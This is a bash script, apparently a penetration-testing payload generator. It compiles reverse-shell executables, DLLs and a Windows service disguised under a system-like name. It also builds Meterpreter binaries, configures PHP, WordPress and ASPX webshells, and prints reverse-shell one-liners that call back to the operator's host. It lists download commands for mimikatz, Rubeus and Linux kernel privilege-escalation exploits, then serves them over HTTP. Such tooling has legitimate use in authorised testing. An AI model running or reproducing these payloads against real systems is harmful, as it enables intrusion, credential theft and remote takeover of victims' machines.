#!/bin/bash

scriptdir=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
lhost="127.0.0.1"
lport=4444

LP="\e[38;5;189m"
G="\e[32m"
R="\e[31m"
BB="\e[1;34m"
M="\e[35m"
LG="\e[38;5;245m"
W="\e[0m"

usage() {
    echo "usage: autogen <options>"
    echo ""
    echo "-i [ip]    -> manually set LHOST"
    echo "-p [port]  -> manually set LPORT"
    echo ""
    echo "--- main options"
    echo "-r    -> only show reverse shell one-liners and don't start http server (default: all = -rl)"
    echo "-l    -> only show payload list (default: all = -rl)"
    echo ""
    echo "--- payload options"
    echo "-c    -> compile basic binaries"
    echo "-m    -> compile meterpreter binaries"
    echo "-w    -> setup webshells"
    echo "-d    -> setup all (-cmw)"
    echo ""
    echo "--- other"
    echo "-s    -> don't start python http server"
    echo "-h    -> help menu"
    exit 1;
}

get_ip_address() {
    if ifconfig tun0 &> /dev/null; then
        lhost=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
    elif ifconfig eth0 &> /dev/null; then
        lhost=$(ifconfig eth0 | grep "inet " | awk '{print $2}')
    elif ifconfig wlan0 &> /dev/null; then
        lhost=$(ifconfig wlan0 | grep "inet " | awk '{print $2}')
    else
        echo "common interfaces not found - you'll have to manually set LHOST with -i"
        exit
    fi
}

compile_payloads() {
    echo -e "\n${M}COMPILING${W}"
    echo -e "${LG}==============================================${W}"
    x86_64-w64-mingw32-gcc $scriptdir/payloads/win/src/dllshell.cpp --shared -o $scriptdir/payloads/win/dllshell.dll -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
    echo -e "${G}[+]${W} dllshell.dll"
    
    x86_64-w64-mingw32-gcc $scriptdir/payloads/win/src/winshell.c -o $scriptdir/payloads/win/winshell.exe -DSERVER_HOST="\"$lhost"\" -DSERVER_PORT="$lport" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32 -w
    echo -e "${G}[+]${W} winshell.exe"

    x86_64-w64-mingw32-gcc $scriptdir/payloads/win/src/rs_service/main.c $scriptdir/payloads/win/src/rs_service/service.c $scriptdir/payloads/win/src/rs_service/shell.c -o $scriptdir/payloads/win/rs_service.exe \
    -DSERVER_HOST=L"\"$lhost\"" -DSERVER_PORT=L"\"$lport\"" -DSERVICE_NAME=L"\"WinMansvc\"" -DSERVICE_DESC=L"\"Windows Managment Service\"" -DDISPLAY_NAME=L"\"WinMansvc\"" -DUNICODE -D_UNICODE -DWIN32_LEAN_AND_MEAN -lws2_32
    echo -e "${G}[+]${W} rs_service.exe"
}

compile_meterpreter() {
    echo -e "\n${M}Making Meterpreter Payloads${W}"
    echo -e "${LG}==============================================${W}"
    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $scriptdir/payloads/win/mettcp.exe
    echo -e "${G}[+]${W} windows meterpreter tcp shell | mettcp.exe\n"
    msfvenom --platform windows --arch x64 --payload windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe > $scriptdir/payloads/win/methttps.exe
    echo -e "${G}[+]${W} windows meterpreter https shell | methttps.exe\n"
    msfvenom --platform linux --arch x64 --payload linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $scriptdir/payloads/lin/linmettcp.elf
    echo -e "${G}[+]${W} linux meterpreter tcp shell | linmettcp.elf\n"
}

set_webshells() {
    echo -e "\n${M}Changing LHOST and LPORT in WebShells${W}"
    echo -e "${LG}==============================================${W}"
    sed -i "s/^\$ip =.*/\$ip = \"$lhost\";/; s/^\$port =.*/\$port = $lport;/" $scriptdir/payloads/web/phpshell.php
    sed -i "s/^\$ip =.*/\$ip = \"$lhost\";/; s/^\$port =.*/\$port = $lport;/" $scriptdir/payloads/web/wpshell-pm.php
    zip $scriptdir/payloads/web/wpshell-pm.zip $scriptdir/payloads/web/wpshell-pm.php

    echo "pentestmonkey reverse shell location -> $scriptdir/payloads/web/phpshell.php"
    echo "pentestmonkey wordpress-plugin zip location -> $scriptdir/payloads/web/wpshell-pm.zip"
    echo "basic ?cmd=[command] wordpress-plugin zip location -> $scriptdir/payloads/web/wpshell-basic.zip"

    sed -i "s/^String host =.*/String host = \"$lhost\";/; s/^int port =.*/int port = $lport;/" $scriptdir/payloads/web/shell.aspx
    echo "aspx shell location -> $scriptdir/payloads/web/shell.aspx"
}

list_oneliners() {
    host="${LP}$lhost${W}"
    port="${LP}$lport${W}"
    echo ""
    echo -e "${BB}ONE LINERS${W}"
    echo -e "${LG}==============================================${W}"
    echo "<?php echo system(\$_GET['cmd'])?>"
    echo "<?php%20echo%20system(\$_GET['cmd'])?>"
    echo ""
    echo -e "bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'"
    echo -e "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$host%2F$port%200%3E%261%22"
    echo -e "%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$host%2F$port%200%3E%261%27%22"
    echo ""
    echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f"
    echo ""
    echo -e "nc -e /bin/bash $host $port"
    echo ""
    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo -e "php -r \$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
    echo ""
    echo -e "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo ""
    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo ""
    if $1; then
        python3 $scriptdir/scripts/genps_quiet.py $lhost $lport
        echo ""
        # below is just for testing, remove if you want
        echo -n "powershell.exe%20-enc%20"; pwsh -File $scriptdir/scripts/create_ps_revshell.ps1 "$lhost" "$lport"
        echo ""
    fi
}

list_payloads()
{
    echo ""
    echo -e "${BB}ACTIVE DIRECTORY${W}"
    echo -e "${LG}==============================================${W}"
    echo -e "iwr -uri http://$lhost/enum/win/PowerView.ps1 -OutFile ${G}PowerView.ps1${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/enum/win/SharpHound.exe -OutFile ${G}SharpHound.exe${W}"
    echo -e "iwr -uri http://$lhost/enum/win/SharpHound.ps1 -OutFile ${G}SharpHound.ps1${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/enum/win/PsLoggedon64.exe -OutFile ${G}PsLoggedon64.exe${W}"
    echo -e "iwr -uri http://$lhost/enum/win/PsExec64.exe -OutFile ${G}PsExec64.exe${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/Rubeus.exe -OutFile ${G}Rubeus.exe${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/mimikatz.exe -OutFile ${G}mimikatz.exe${W}"
    echo ""
    echo ""
    echo -e "${BB}PIVOTING${W}"
    echo -e "${LG}==============================================${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/nmap.exe -OutFile ${G}nmap.exe${W}"
    echo -e "wget http://$lhost/payloads/lin/${G}nmap${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/socat/socat.exe -OutFile ${G}socat.exe${W}"
    echo -e "wget http://$lhost/payloads/lin/${G}socat${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/SharpChisel.exe -OutFile ${G}SharpChisel.exe${W}"
    echo -e "wget http://$lhost/payloads/lin/${G}chisel${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/plink.exe -OutFile ${G}plink.exe${W}"
    echo ""
    echo ""
    echo -e "${BB}WINDOWS PRIVILEGE ESCALATION${W}"
    echo -e "${LG}==============================================${W}"
    echo -e "${R}>${W} if you only have a cmd.exe shell then use below instead (mettcp.exe example)"
    echo -e "${R}>${W} powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$lhost/payloads/mettcp.exe','mettcp.exe')"
    echo ""
    echo -e "iwr -uri http://$lhost/enum/win/winPEASx64.exe -OutFile ${G}winpeas.exe${W}"
    echo -e "iwr -uri http://$lhost/enum/win/PowerUp.ps1 -OutFile ${G}PowerUp.ps1${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/nc.exe -OutFile ${G}nc.exe${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/powercat.ps1 -OutFile ${G}powercat.ps1${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/useradd.exe -OutFile ${G}useradd.exe${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/winshell.exe -OutFile ${G}winshell.exe${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/cppdll_useradd.dll -OutFile ${G}cppdll_useradd.dll${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/cppdll_shell.dll -OutFile ${G}cppdll_shell.dll${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/payloads/win/mettcp.exe -OutFile ${G}mettcp.exe${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/methttps.exe -OutFile ${G}methttps.exe${W}"
    echo -e "iwr -uri http://$lhost/payloads/win/rs_service.exe -OutFile ${G}rs_service.exe${W}"
    echo ""
    echo -e "iwr -uri http://$lhost/exploits/win/PrintSpoofer64.exe -OutFile ${G}PrintSpoofer64.exe${W}"
    echo ""
    echo ""
    echo -e "${BB}LINUX PRIVILEGE ESCALATION${W}"
    echo -e "${LG}==============================================${W}"
    echo "python3 -c \"import pty;pty.spawn('/bin/bash');\""
    echo ""
    echo -e "curl http://$lhost/enum/lin/${G}linpeas.sh${W} | sh"
    echo -e "wget http://$lhost/enum/lin/${G}linpeas.sh${W}"
    echo -e "wget http://$lhost/enum/lin/${G}LinEnum.sh${W}"
    echo -e "wget http://$lhost/enum/lin/${G}unix-privesc-check${W}"
    echo -e "wget http://$lhost/enum/lin/${G}traitor${W}"
    echo -e "wget http://$lhost/enum/lin/${G}pspy64${W}"
    echo ""
    echo -e "wget http://$lhost/payloads/lin/${G}ncat${W}"
    echo -e "wget http://$lhost/payloads/lin/${G}linmettcp.elf${W}"
    echo ""
    echo -e "wget -r -nH http://$lhost/exploits/lin/${G}exploit_nss${W}/"
    echo -e "wget http://$lhost/exploits/lin/${G}PwnKit${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}pwnkit4034.c${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}dirty${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}dirty.c${W}"
    echo ""
    echo -e "wget http://$lhost/exploits/lin/${G}ebpf_verifier.c${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}chocobo_root.c${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}perf_swevent.c${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}polkit3560.sh${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}dirtycow.c${W}"
    echo -e "wget http://$lhost/exploits/lin/${G}ptrace.c${W}"
    echo ""
}

start_http_server() {
    if [[ $(ps -ef | grep -E "python3 -m http.server( 80)?$" | grep -v grep | wc -l) -eq 0 ]]; then
        python3 -m http.server 80 -d $scriptdir
    else
        echo "python HTTP server is already running on port 80"
    fi
}

custom_lhost=false
compile=false
meterpreter=false
webshells=false
start_python=true
compile_and_dontlist=false
print_oneliners=false
print_payloads=false

while getopts ":rlcmwdgsi:p:" opt; do
    case ${opt} in
    r )
        print_oneliners=true
        ;;
    l )
        print_payloads=true
        ;;
    c )
        compile=true
        ;;
    m )
        meterpreter=true
        ;;
    w )
        webshells=true
        ;;
    d )
        compile_and_dontlist=true
        ;;
    s )
        start_python=false
        ;;
    i )
        lhost=${OPTARG}
        custom_lhost=true
        ;;
    p )
        lport=${OPTARG}
        ;;
    h|\? )
        usage
        ;;
    esac
done
shift $((OPTIND -1))


if ! $custom_lhost; then
    get_ip_address
fi

if $compile; then
    compile_payloads
fi

if $meterpreter; then
    compile_meterpreter
fi

if $webshells; then
    set_webshells
    exit 1
fi

if $compile_and_dontlist; then
    compile_payloads
    compile_meterpreter
    set_webshells
else
    if $print_oneliners; then
        list_oneliners  true
    elif $print_payloads; then
        list_payloads
        if $start_python; then
            start_http_server
        fi
    else
        list_oneliners false
        list_payloads
        if $start_python; then
            start_http_server
        fi
    fi
fi
